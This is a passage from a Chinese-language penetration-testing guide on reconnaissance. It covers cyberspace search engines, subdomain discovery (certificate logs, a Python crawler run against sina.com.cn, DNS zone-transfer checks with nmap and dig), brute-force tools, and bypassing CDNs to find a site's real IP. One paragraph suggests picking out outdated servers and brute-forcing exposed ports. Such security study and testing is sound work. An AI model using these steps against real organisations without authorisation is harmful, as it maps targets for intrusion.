<li>app：搜索指定的组件 列如：<strong>app:“apache ”</strong></li>
<li>response：查询端口原生返回数据中包含指定参数的资产 列如：<strong>response:“google.com”</strong></li>
</ul>
<h3 id="相应网站" class="headerLink">
    <a href="#%e7%9b%b8%e5%ba%94%e7%bd%91%e7%ab%99" class="header-mark"></a>相应网站</h3><p><a href="https://search.censys.io/" target="_blank" rel="noopener noreferrer">Censys Search</a></p>
<p><a href="https://www.greynoise.io/" target="_blank" rel="noopener noreferrer">GreyNoise</a></p>
<p><a href="https://zhidao.baidu.com/question/750335434727022652.html" target="_blank" rel="noopener noreferrer">各个国家代码是什么？_百度知道</a></p>
<p><a href="https://github.com/0x727/Space_view" target="_blank" rel="noopener noreferrer">https://github.com/0x727/Space_view</a></p>
<h3 id="聚合测绘空间搜索工具" class="headerLink">
    <a href="#%e8%81%9a%e5%90%88%e6%b5%8b%e7%bb%98%e7%a9%ba%e9%97%b4%e6%90%9c%e7%b4%a2%e5%b7%a5%e5%85%b7" class="header-mark"></a>聚合测绘空间搜索工具</h3><p>项目名称：聚合测绘空间搜索（<strong>HW*</strong>*蓝队情报收集**） 项目地址：<a href="https://github.com/atdpa4sw0rd/Search-Tools" target="_blank" rel="noopener noreferrer">https://github.com/atdpa4sw0rd/Search-Tools</a></p>
<p>支持搜索的引擎：<strong>Fofa*</strong>*、Zoomeye、Quake、Shodan、Censys、BinaryEdge、threatbook**</p>
<p>1. git clone <a href="https://github.com/atdpa4sw0rd/Search-Tools.git" target="_blank" rel="noopener noreferrer">https://github.com/atdpa4sw0rd/Search-Tools.git</a><br>
2. cd Search-Tools &amp;&amp; pip3 install -r requirements.txt<br>
3. python3 search_main.py</p>
<h2 id="app小程序公众号信息收集" class="headerLink">
    <a href="#app%e5%b0%8f%e7%a8%8b%e5%ba%8f%e5%85%ac%e4%bc%97%e5%8f%b7%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>APP、小程序、公众号信息收集</h2><h2 id="1app信息搜集" class="headerLink">
    <a href="#1app%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86" class="header-mark"></a>1、APP信息搜集</h2><h3 id="11七麦数据" class="headerLink">
    <a href="#11%e4%b8%83%e9%ba%a6%e6%95%b0%e6%8d%ae" class="header-mark"></a>1.1、七麦数据</h3><p><a href="https://www.qimai.cn/" target="_blank" rel="noopener noreferrer">https://www.qimai.cn/</a></p>
<p>通过当前APP查询所属公司的所有APP</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003cDXMR0UDXgc.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003cDXMR0UDXgc.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003cDXMR0UDXgc.jpg">
        
    </a></p>
<p>通过当前APP查询同开发者应用</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000041izwc3c2tHC.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000041izwc3c2tHC.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000041izwc3c2tHC.jpg">
        
    </a></p>
<h3 id="12appstore安卓和ios" class="headerLink">
    <a href="#12appstore%e5%ae%89%e5%8d%93%e5%92%8cios" class="header-mark"></a>1.2、AppStore(安卓和IOS)</h3><p>查询同开发者应用</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000rhjpq2AuZpv.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000rhjpq2AuZpv.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000rhjpq2AuZpv.jpg">
        
    </a></p>
<h2 id="2微信公众号和小程序" class="headerLink">
    <a href="#2%e5%be%ae%e4%bf%a1%e5%85%ac%e4%bc%97%e5%8f%b7%e5%92%8c%e5%b0%8f%e7%a8%8b%e5%ba%8f" class="header-mark"></a>2、微信公众号和小程序</h2><p>通过微信搜索公众号并去关注，然后进去点击文章之类的，下拉可以看到它的网页来源，大部分是微信提供的，所以需要去阅读原文，但是原文也可能是第三方提供的，所以还需要自己自行去判断，找到它的url后又可以去爆一波子域名了，</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003Lsjol0WBgCZ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003Lsjol0WBgCZ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003Lsjol0WBgCZ.jpg">
        
    </a></p>
<p>随便点击文章通过下拉查看域名，例如：</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002kGrBY24lGHS.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002kGrBY24lGHS.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002kGrBY24lGHS.jpg">
        
    </a></p>
<h2 id="4logo" class="headerLink">
    <a href="#4logo" class="header-mark"></a>4、logo</h2><p>当你不确定目标产品是什么时，比如你不知道他是谁家的WAF或者路由器，可以利用查看网站logo地址，然后复制logo地址，点击按图片搜索，到谷歌里面查询；也可以把目标logo下载下来，利用上传图片来查询，通过搜索出来的结果可以判断目标产品和厂商。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002cRSsh3Xen0c.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002cRSsh3Xen0c.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002cRSsh3Xen0c.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000VuLjz2PCjqN.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000VuLjz2PCjqN.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000VuLjz2PCjqN.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004IiLEn3QRnKY.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004IiLEn3QRnKY.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004IiLEn3QRnKY.jpg">
        
    </a></p>
<h2 id="5faviconico" class="headerLink">
    <a href="#5faviconico" class="header-mark"></a>5、favicon.ico</h2><p>首先先来介绍一下什么favicon.ico文件，所谓favicon，便是其可以让浏览器的收藏夹中除显示相应的标题外，还以图标的方式区别不同的网站。favicon.ico也被称为 website icon（网页图标）、page icon（页面图标）或url icon（URL图标），具体细节请问度娘。下面这个小东西就是 Favicon.ico，我们可以通过在shodan里寻找它的哈希并去查找相关资产，打开shodan页面，或者用shodan插件都行。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002oVXWZ0rgr7N.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002oVXWZ0rgr7N.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002oVXWZ0rgr7N.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002XXeW40yMFhg.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002XXeW40yMFhg.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002XXeW40yMFhg.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002isyKQ0274IC.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002isyKQ0274IC.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002isyKQ0274IC.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000027CCM53oVdun.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000027CCM53oVdun.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000027CCM53oVdun.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002WlhaG0vHSr5.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002WlhaG0vHSr5.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002WlhaG0vHSr5.jpg">
        
    </a></p>
<h2 id="三子域名收集挖掘" class="headerLink">
    <a href="#%e4%b8%89%e5%ad%90%e5%9f%9f%e5%90%8d%e6%94%b6%e9%9b%86%e6%8c%96%e6%8e%98" class="header-mark"></a>三、子域名收集(挖掘)</h2><h2 id="1sslhttps证书" class="headerLink">
    <a href="#1sslhttps%e8%af%81%e4%b9%a6" class="header-mark"></a>1、SSL(HTTPS)证书</h2><p>点击浏览器网站旁边的小锁，然后点击证书就可以查看到该网站的SSL证书了</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001yLjZX3ELjE0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001yLjZX3ELjE0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001yLjZX3ELjE0.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003QMFnL1osvdX.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003QMFnL1osvdX.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003QMFnL1osvdX.jpg">
        
    </a></p>
<h3 id="11大厂商ssl证书一证多用" class="headerLink">
    <a href="#11%e5%a4%a7%e5%8e%82%e5%95%86ssl%e8%af%81%e4%b9%a6%e4%b8%80%e8%af%81%e5%a4%9a%e7%94%a8" class="header-mark"></a>1.1、大厂商SSL证书一证多用</h3><p>大厂商的SSL证书一般都是<strong>一证多用</strong>，根据证书透明日志这个特性，可以得知一些子域名。</p>
<p>如百度：<a href="https://www.baidu.com/" target="_blank" rel="noopener noreferrer">https://www.baidu.com</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003qeV422O7TxL.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003qeV422O7TxL.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003qeV422O7TxL.jpg">
        
    </a></p>
<p>如搜狐：<a href="https://vpn.sohu-inc.com/" target="_blank" rel="noopener noreferrer">https://vpn.sohu-inc.com</a></p>
<h3 id="12https证书错误泄露域名" class="headerLink">
    <a href="#12https%e8%af%81%e4%b9%a6%e9%94%99%e8%af%af%e6%b3%84%e9%9c%b2%e5%9f%9f%e5%90%8d" class="header-mark"></a>1.2、HTTPS证书错误泄露域名</h3><p>有时候https证书报错会泄露域名</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001ZvEWY33PT9F.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001ZvEWY33PT9F.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001ZvEWY33PT9F.jpg">
        
    </a></p>
<h3 id="13在线网站证书查询" class="headerLink">
    <a href="#13%e5%9c%a8%e7%ba%bf%e7%bd%91%e7%ab%99%e8%af%81%e4%b9%a6%e6%9f%a5%e8%af%a2" class="header-mark"></a>1.3、在线网站证书查询</h3><p><a href="https://crt.sh/" target="_blank" rel="noopener noreferrer">https://crt.sh/</a></p>
<p><a href="https://censys.io/" target="_blank" rel="noopener noreferrer">https://censys.io/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000013Ul2u0RWb2R.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000013Ul2u0RWb2R.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000013Ul2u0RWb2R.jpg">
        
    </a></p>
<h2 id="2网络深度爬虫" class="headerLink">
    <a href="#2%e7%bd%91%e7%bb%9c%e6%b7%b1%e5%ba%a6%e7%88%ac%e8%99%ab" class="header-mark"></a>2、网络深度爬虫</h2><p>以<a href="https://forum.butian.net/share/www.sina.com.cn" target="_blank" rel="noopener noreferrer">www.sina.com.cn</a>为例，我们使用正则表达式抓取页面以sina.com.cn结尾的所有的URL（一级深度）。</p>
<h2 id="usrbinenv-python" class="headerLink">
    <a href="#usrbinenv-python" class="header-mark"></a>!/usr/bin/env python</h2><h2 id="codingutf-8" class="headerLink">
    <a href="#codingutf-8" class="header-mark"></a>coding=utf-8</h2><h2 id="authordavefangoutlookcommailtodavefangoutlookcom" class="headerLink">
    <a href="#authordavefangoutlookcommailtodavefangoutlookcom" class="header-mark"></a>author=<a href="mailto:dave.fang@outlook.com" rel="">dave.fang@outlook.com</a></h2><h2 id="create20160701" class="headerLink">
    <a href="#create20160701" class="header-mark"></a>create=20160701</h2><p>import re</p>
<p>import requests</p>
<p>from pprint import pprint</p>
<p>def crawl_page(url, domain):</p>
<p>print(&rsquo;[*] Crawl URL: {0}&rsquo;.format(url))</p>
<p>found_url = set()</p>
<p>req = requests.get(url, timeout=15)</p>
<p>content = req.text</p>
<p>link_list = re.findall(r&quot;(?&lt;=href=&quot;).+?(?=&quot;)|(?&lt;=href=&rsquo;).+?(?=&rsquo;)&quot;, content)</p>
<p>for url in link_list:</p>
<p>result = re.findall(&lsquo;http[s]?://(.*?).sina.com.cn&rsquo;, url)</p>
<p>if len(result) &gt; 0:</p>
<p>found_url.add(&rsquo;{0}.{1}&rsquo;.format(result[0], domain))</p>
<p>pprint(found_url)</p>
<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>
<p>page_url = &lsquo;<a href="http://www.sina.com.cn/" target="_blank" rel="noopener noreferrer">http://www.sina.com.cn/</a>&rsquo;</p>
<p>main_domain = &lsquo;sina.com.cn&rsquo;</p>
<p>crawl_page(page_url, main_domain)</p>
<p>一级深度爬出来的结果，就有146个子域名，这个小脚本权当抛砖引玉，可以再深度定制。</p>
<p>[*] Crawl URL: <a href="http://www.sina.com.cn/" target="_blank" rel="noopener noreferrer">http://www.sina.com.cn/</a></p>
<p>{&lsquo;2016.sina.com.cn&rsquo;,</p>
<p>&lsquo;ah.sina.com.cn&rsquo;,</p>
<p>&lsquo;ai.lottery.sina.com.cn&rsquo;,</p>
<p>&lsquo;aipai.sina.com.cn&rsquo;,</p>
<p>&lsquo;app.sina.com.cn&rsquo;,</p>
<p>&lsquo;astro.sina.com.cn&rsquo;,</p>
<p>&lsquo;auto.sina.com.cn&rsquo;,</p>
<p>&lsquo;career.sina.com.cn&rsquo;,</p>
<p>&hellip;</p>
<p>&lsquo;golf.sina.com.cn&rsquo;,</p>
<p>&lsquo;zx.jiaju.sina.com.cn&rsquo;}</p>
<p>[*] Found Links Num: 146</p>
<h2 id="3域传送漏洞" class="headerLink">
    <a href="#3%e5%9f%9f%e4%bc%a0%e9%80%81%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3、域传送漏洞</h2><p>快速判断出某个特定区域的所有主机,获取域信息,如网络拓扑结构、服务器ip地址,为攻击者的入侵提供大量敏感信息。</p>
<h3 id="31常用dns记录" class="headerLink">
    <a href="#31%e5%b8%b8%e7%94%a8dns%e8%ae%b0%e5%bd%95" class="header-mark"></a>3.1、常用DNS记录</h3><p>主机记录(A记录): A记录是用于名称解析的重要记录,它将特定的主机名映射到对应主机的IP地址上。</p>
<p>IPv6主机记录(AAAA记录): 与A记录对应,用于将特定的主机名映射到一个主机的IPv6地址。</p>
<p>别名(CNAME记录): CNAME记录用于将某个别名指向到某个A记录上,这样就不需要再为某个新名字另外创建一条新的A记录。</p>
<p>电子邮件交换记录（MX记录): 记录一个邮件域名对应的IP地址</p>
<p>域名服务器记录 (NS记录): 记录该域名由哪台域名服务器解析</p>
<p>反向记录(PTR记录): 也即从IP地址到域名的一条记录</p>
<p>TXT记录：记录域名的相关文本信息</p>
<h3 id="32dns区域传送" class="headerLink">
    <a href="#32dns%e5%8c%ba%e5%9f%9f%e4%bc%a0%e9%80%81" class="header-mark"></a>3.2、DNS区域传送</h3><p>DNS服务器分为主服务器、备份服务器和缓存服务器。而域传送指的是一台备用服务器使用来自主服务器的数据更新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度,其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。</p>
<h3 id="33域传送漏洞" class="headerLink">
    <a href="#33%e5%9f%9f%e4%bc%a0%e9%80%81%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3.3、域传送漏洞</h3><p>DNS区域传送(DNS transfer)指后备DNS服务器从主服务器获取数据,以更新自己的zone数据库，这可以防止因主DNS服务器故障造成的业务中断,为DNS服务提供了冗余备份，但是许多DNS服务器却被错误配置成只要收到AXFR请求,就向对方进行域传送。</p>
<p>当存在这种错误配置时,攻击者就可以获取整个域的所有记录,造成整个网络架构泄露。正确的配置包括</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
<h3 id="34检测" class="headerLink">
    <a href="#34%e6%a3%80%e6%b5%8b" class="header-mark"></a>3.4、检测</h3><p>nmap脚本扫描</p>
<p>nmap –script dns-zone-transfer –script-args dns-zone-transfer.domain=targetdomain -p 53 -Pn dns.xxx</p>
<p>dig命令</p>
<p>dig @114.114.114.114 twosmi1e.com axfr @指定DNS服务器, 后面指定域名,axfr为域传送请求</p>
<p>nslookup</p>
<p>输入nslookup命令进入交互式shell界面;</p>
<p>server 命令参数设定查询将要使用的DNS服务器;针对某个域名可先输入域名获取dns信息。</p>
<p>ls命令列出某个域中的所有域名;如果太长不适合查看可定向保存至文件夹中。</p>
<p>exit命令退出</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000vtiyG0IxO2J.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000vtiyG0IxO2J.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000vtiyG0IxO2J.jpg">
        
    </a></p>
<h2 id="4在线dns数据" class="headerLink">
    <a href="#4%e5%9c%a8%e7%ba%bfdns%e6%95%b0%e6%8d%ae" class="header-mark"></a>4、在线DNS数据</h2><p>有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。</p>
<h3 id="41virustotal" class="headerLink">
    <a href="#41virustotal" class="header-mark"></a>4.1、VirusTotal</h3><p><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener noreferrer">https://www.virustotal.com/#/home/search</a></p>
<h3 id="42dnsdumpster" class="headerLink">
    <a href="#42dnsdumpster" class="header-mark"></a>4.2、DNSdumpster</h3><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener noreferrer">https://dnsdumpster.com/</a></p>
<h3 id="42dnsdb" class="headerLink">
    <a href="#42dnsdb" class="header-mark"></a>4.2、dnsdb</h3><p><a href="https://www.dnsdb.io/zh-cn/" target="_blank" rel="noopener noreferrer">https://www.dnsdb.io/zh-cn/</a></p>
<h2 id="5自身泄漏" class="headerLink">
    <a href="#5%e8%87%aa%e8%ba%ab%e6%b3%84%e6%bc%8f" class="header-mark"></a>5、自身泄漏</h2><p>robots.txt</p>
<p>crossdomain.xml(跨域策略文件cdx)</p>
<p>从流量中分析提取</p>
<h2 id="6github泄露" class="headerLink">
    <a href="#6github%e6%b3%84%e9%9c%b2" class="header-mark"></a>6、Github泄露</h2><h2 id="7google-hacking" class="headerLink">
    <a href="#7google-hacking" class="header-mark"></a>7、Google Hacking</h2><p>搜索引擎查询都会做一些反制爬虫的手段，目前使用google去采集的方法是调用google的官方API，或者调用bing的API去辅助采集。</p>
<h2 id="8在线子域名查询" class="headerLink">
    <a href="#8%e5%9c%a8%e7%ba%bf%e5%ad%90%e5%9f%9f%e5%90%8d%e6%9f%a5%e8%af%a2" class="header-mark"></a>8、在线子域名查询</h2><p><a href="http://sbd.ximcx.cn/" target="_blank" rel="noopener noreferrer">http://sbd.ximcx.cn/</a></p>
<p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener noreferrer">http://tool.chinaz.com/subdomain/</a></p>
<h2 id="9子域名枚举爆破" class="headerLink">
    <a href="#9%e5%ad%90%e5%9f%9f%e5%90%8d%e6%9e%9a%e4%b8%be%e7%88%86%e7%a0%b4" class="header-mark"></a>9、子域名枚举爆破</h2><p>向DNS服务器(如8.8.8.8和8.8.4.4)请求字典里面的子域名，看返回的数据里面是否有记录，如果有则说明这是一个存在的子域名。比如说，向114.114.114.114定向请求<a href="https://forum.butian.net/share/www.qq.com" target="_blank" rel="noopener noreferrer">www.qq.com</a>的记录，返回了一条A记录指向182.254.34.74，就说明存在这个域名；相应的请求wooyun.qq.com并没有相应的记录返回，这就说明没有这个域名存在。</p>
<p>*<strong>注：一般只使用同一套主、副DNS，即8.8.8.8和8.8.4.4，DNS服务器不宜混搭，否则容易出现大量误报*</strong></p>
<p>发包可以用第三方库，比如说lijiejie的subDomainBrute使用了dnspython这个包。使用第三方包的确好，但是免不了一层封装和不能很好地理解DNS报文协议，也可能会降低一定的效率，和<strong>没有解决泛解析的好办法</strong>。</p>
<p><em><strong>泛解析这个问题的解决方法很简单，向DNS请求*记录，然后把枚举子域名回来的记录和*的记录比对，如果相同则直接排除\</strong></em>。但是实际上，如果使用第三方包，不自己造轮子的话，是无法实现这个的。因为有些域名的*记录是CNAME，而第三方包只能解析出IP却不会返回出CNAME给你。举个例子，以<a href="https://forum.butian.net/share/www.baidu.com" target="_blank" rel="noopener noreferrer">www.baidu.com</a>，大家ping一下都知道会跳转到<a href="https://forum.butian.net/share/www.a.shifen.com" target="_blank" rel="noopener noreferrer">www.a.shifen.com</a>，这就是一个CNAME记录，但是我们用第三方包只能获得最后解析出来的ip。</p>
<p>也就是说，<strong>如果一个域名他的泛解析是一个CNAME记录而且这又是一个CDN域名</strong>(恰巧这个又不少)，那么不是自己定制的dns查询函数，一般都会出现大量泛解析误报。这就有点像是灯下黑，知道了怎么做就可以了，却一直没有解决的办法。</p>
<p>如果要自己定制的话需要研究一下DNS报文协议，这里引用两张图片做简要分析</p>
<p>这是向DNS请求部分的：</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002yg7zJ3xAqfA.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002yg7zJ3xAqfA.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002yg7zJ3xAqfA.jpg">
        
    </a></p>
<p>这是DNS服务器回传的报文：</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000018Iupz1eIHF2.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000018Iupz1eIHF2.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000018Iupz1eIHF2.jpg">
        
    </a></p>
<p>只需要按照这个协议的格式做正则提取即可获得我们想要的信息，A记录的是固定的正则，CNAME记录需要嵌套一层正则才能获取。</p>
<p>这里提供几个测试域名，都有CNAME记录作为泛解析的。</p>
<p>alitrip.com</p>
<p>taobao.com</p>
<p>tmall.com</p>
<p>52pk.com</p>
<p>focus.cn</p>
<h3 id="91oneforall" class="headerLink">
    <a href="#91oneforall" class="header-mark"></a>9.1、OneForAll</h3><p>下载地址：<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener noreferrer">https://github.com/shmilylty/OneForAll</a></p>
<p>目前支持一键收集：子域、子域常用端口、子域Title、子域状态、子域服务器等</p>
<p>020_信息收集_子域名OneForAll</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000001kS9l1bm3Vr.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000001kS9l1bm3Vr.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000001kS9l1bm3Vr.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002xRXxs2HclP3.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002xRXxs2HclP3.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002xRXxs2HclP3.jpg">
        
    </a></p>
<h3 id="92subdomainbrute" class="headerLink">
    <a href="#92subdomainbrute" class="header-mark"></a>9.2、subDomainBrute</h3><p>工具地址： <a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener noreferrer">https://github.com/lijiejie/subDomainsBrute</a></p>
<p>高并发的DNS暴力枚举工具</p>
<p>020_信息收集_子域名subDomainsBrute</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000001ESMo29OyTX.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000001ESMo29OyTX.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000001ESMo29OyTX.jpg">
        
    </a></p>
<h3 id="93layer" class="headerLink">
    <a href="#93layer" class="header-mark"></a>9.3、Layer</h3><p>Layer子域名挖掘机是一款域名查询工具，可提供网站子域名查询服务；拥有简洁的界面、简单的操作模式，支持服务接口、暴力搜索、同服挖掘三种模式，支持打开网站、复制域名、复制IP、复制CDN、导出域名、导出IP、导出域名+IP、导出域名+IP+WEB服务器以及导出存活网站！</p>
<p>通过查看WEB服务器信息，筛选版本比较低的服务器（win2003+iis6.0），查看每个子域名是否开启常见的端口（3389、3306、21端口等），利用爆破工具进行枚举，会达到事半功倍的效果。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001JyY2d26Js8x.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001JyY2d26Js8x.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001JyY2d26Js8x.jpg">
        
    </a></p>
<h3 id="94fuzsub" class="headerLink">
    <a href="#94fuzsub" class="header-mark"></a>9.4、FuzSub</h3><p><a href="https://github.com/DavexPro/FuzSub" target="_blank" rel="noopener noreferrer">https://github.com/DavexPro/FuzSub</a></p>
<h3 id="95fierce" class="headerLink">
    <a href="#95fierce" class="header-mark"></a>9.5、Fierce</h3><p><a href="https://github.com/davidpepper/fierce-domain-scanner" target="_blank" rel="noopener noreferrer">https://github.com/davidpepper/fierce-domain-scanner</a></p>
<h3 id="96御剑" class="headerLink">
    <a href="#96%e5%be%a1%e5%89%91" class="header-mark"></a>9.6、御剑</h3><h3 id="97wydomain" class="headerLink">
    <a href="#97wydomain" class="header-mark"></a>9.7、wydomain</h3><h3 id="98orangescan" class="headerLink">
    <a href="#98orangescan" class="header-mark"></a>9.8、orangescan</h3><h3 id="99dnsrecon" class="headerLink">
    <a href="#99dnsrecon" class="header-mark"></a>9.9、DNSRecon</h3><h3 id="910k8" class="headerLink">
    <a href="#910k8" class="header-mark"></a>9.10、K8</h3><h2 id="四ip信息收集" class="headerLink">
    <a href="#%e5%9b%9bip%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>四、IP信息收集</h2><p>首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：<strong><a href="http://ping.chinaz.com/" target="_blank" rel="noopener noreferrer">http://ping.chinaz.com/</a></strong> 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，<strong>如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了</strong>。</p>
<h2 id="1cdn概念" class="headerLink">
    <a href="#1cdn%e6%a6%82%e5%bf%b5" class="header-mark"></a>1、CDN概念</h2><p>内容分发网络(content delivery network或content distribution network,缩写作CDN)指一种通过互联网互相连接的电脑网络系统,利用最靠近每位用户的服务器,更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户,来提供高性能、可扩展性及低成本的网络内容传递给用户，<strong>主要就是通过多个不同节点加快网站的访问速度。</strong></p>
<h2 id="2判断是否真实ip" class="headerLink">
    <a href="#2%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e7%9c%9f%e5%ae%9eip" class="header-mark"></a>2、判断是否真实IP</h2><h3 id="21nslookup" class="headerLink">
    <a href="#21nslookup" class="header-mark"></a>2.1、nslookup</h3><p><strong>命令端</strong></p>
<p>意义：用了CDN的会返回多个IP地址</p>
<p><strong>在线工具</strong></p>
<p><a href="http://tools.bugscaner.com/nslookup/" target="_blank" rel="noopener noreferrer">http://tools.bugscaner.com/nslookup/</a></p>
<p><a href="http://tool.chinaz.com/nslookup/" target="_blank" rel="noopener noreferrer">http://tool.chinaz.com/nslookup/</a></p>
<h3 id="22多地ping" class="headerLink">
    <a href="#22%e5%a4%9a%e5%9c%b0ping" class="header-mark"></a>2.2、多地ping</h3><p>看IP是否一致，在线工具：</p>
<p><a href="http://ping.chinaz.com/" target="_blank" rel="noopener noreferrer">http://ping.chinaz.com/</a>、</p>
<p><a href="http://ping.aizhan.com/" target="_blank" rel="noopener noreferrer">http://ping.aizhan.com/</a>、</p>
<h3 id="23ip反查" class="headerLink">
    <a href="#23ip%e5%8f%8d%e6%9f%a5" class="header-mark"></a>2.3、IP反查</h3><p>反查IP有多个域名,那IP多半不是真实IP</p>
<h2 id="3绕cdn找真实ip" class="headerLink">
    <a href="#3%e7%bb%95cdn%e6%89%be%e7%9c%9f%e5%ae%9eip" class="header-mark"></a>3、绕CDN找真实IP</h2><h3 id="31子域名" class="headerLink">
    <a href="#31%e5%ad%90%e5%9f%9f%e5%90%8d" class="header-mark"></a>3.1、子域名</h3><p>CDN不便宜，所以很多站都是主站做了CDN，而很多小站没做CDN，所以可以通过上面收集到的子域名查询到真实的IP地址，进而知道网站真实IP的C段了。</p>
